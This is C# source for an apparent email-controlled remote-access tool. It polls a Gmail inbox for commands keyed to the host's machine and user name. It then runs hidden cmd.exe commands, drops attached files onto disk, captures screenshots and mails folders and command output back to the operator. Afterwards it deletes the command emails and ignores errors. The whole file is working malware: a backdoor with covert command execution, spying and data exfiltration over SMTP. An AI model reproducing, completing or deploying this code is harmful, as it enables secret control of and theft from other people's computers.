using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Net;
using System.Net.Mail;

using System.IO;

using System.Drawing;
using System.Drawing.Imaging;

using System.Threading;
using ActiveUp.Net.Mail;

using System.Diagnostics;

using System.Windows.Forms;

namespace Windows_E_mail_Host
{
    class Program
    {
        private const string Login = "";
        private const string Password = "";
        
        static string SSPatch = Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);


        static void Main(string[] args)
        {
            System.Threading.Timer checkForNewMail = new System.Threading.Timer(CheckForMail, null, 0, 10000);

            Console.ReadKey();
        }
        
        static void CheckForMail(object o)
        {
            MailRepository mailRepository = new MailRepository(
                                    "imap.gmail.com",
                                    993,
                                    true,
                                    Login,
                                    Password);

            var allEmailsIndexes = mailRepository.GetMailIndexes("inbox", "ALL");

            for (int i = allEmailsIndexes.Length - 1; i >= 0; i--)
            {
                ActiveUp.Net.Mail.Message email = mailRepository.GetEmail("inbox", allEmailsIndexes[i]);
                if (email.Subject == Environment.MachineName + " / " + Environment.UserName)
                {
                    Console.WriteLine(email.BodyText.Text);


                    string[] EmailLines = email.BodyText.Text.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);



                    for (int line = 0; line < EmailLines.Length; line++)
                    {
                        switch (EmailLines[line])
                        {
                            case "CMD":
                                List<string> commands = new List<string>();
                                for (int j = line + 1; j < EmailLines.Length; j++)
                                {
                                    if (EmailLines[j] == "END")
                                    {
                                        line = j;
                                        break;
                                    }
                                    else commands.Add(EmailLines[j]);
                                }
                                sendEmail("CMD Return", UseCMD(commands), null);
                                break;

                            case "DOWNLOAD ATTACHMENT":

                                string dpatch = @"C:\ProgramData\SystemData\";
                                line++;
                                if (EmailLines[line] != "END") dpatch = EmailLines[line];
                                line++;

                                if (email.Attachments.Count > 0)
                                    email.Attachments.StoreToFolder(dpatch);

                                break;
                            case "MAKE SS":
                                string ssname = MakeScreenCapture();
                                sendEmail("Screen captured", "", new[] { ssname });
                                File.Delete(ssname);

                                break;
                            case "SEND FOLDER":
                                string spatch = @"C:\ProgramData\SystemData\";
                                line++;
                                if (EmailLines[line] != "END") spatch = EmailLines[line];
                                line++;

                                if (Directory.Exists(spatch)) sendEmail("FOLDER CONTENT SENDED", "", Directory.GetFiles(spatch));
                                else sendEmail("FOLDER DOESN'T EXIST", "", null);

                                break;
                        }

                    }
                    
                    mailRepository.DelateMessage("inbox", allEmailsIndexes[i]);
                }
            }
        }

        static string UseCMD(List<string> commands)
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            foreach (string command in commands)
                cmd.StandardInput.WriteLine(command);

            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();

            return cmd.StandardOutput.ReadToEnd();
        }

        static void sendEmail(string subject, string body, string[] attachmentsPatch)
        {
            try
            {
                using (System.Net.Mail.SmtpClient client = new System.Net.Mail.SmtpClient())
                {
                    var credential = new NetworkCredential()
                    {
                        UserName = Login,
                        Password = Password
                    };

                    client.Credentials = credential;

                    client.Host = "smtp.gmail.com";
                    client.Port = 587;
                    client.EnableSsl = true;

                    var message = new MailMessage();

                    message.To.Add(new MailAddress(""));
                    message.From = new MailAddress("");

                    //message.IsBodyHtml = true;

                    if (attachmentsPatch != null)
                        foreach (string attachmentPatch in attachmentsPatch)
                            message.Attachments.Add(new Attachment(attachmentPatch));


                    StringBuilder bd = new StringBuilder(300);


                    bd.Append(Environment.UserName);
                    bd.Append(" - ");
                    bd.Append(subject);

                    message.Subject = bd.ToString();

                    bd.Clear();

                    bd.Append(@"Machinename: ");
                    bd.Append(Environment.MachineName);
                    bd.Append(Environment.NewLine);
                    bd.Append(@"Username: ");
                    bd.Append(Environment.UserName);
                    bd.Append(Environment.NewLine);
                    bd.Append(Environment.NewLine);
                    bd.Append(DateTime.Now.ToString("yyyy-mm-dd + hh;mm;ss.fff"));
                    bd.Append(Environment.NewLine);
                    bd.Append(Environment.NewLine);
                    bd.Append(body);

                    message.Body = bd.ToString();


                    client.Send(message);
                }
            }
            catch (Exception) { }
        }

        static string MakeScreenCapture()
        {
            String name = SSPatch + DateTime.Now.ToString("yyyy-MM-dd + HH;mm;ss.fff") + ".jpg";

            Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                            Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(printscreen as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);

            
            printscreen.Save(name, ImageFormat.Jpeg);

            return name;
        }


    }
}
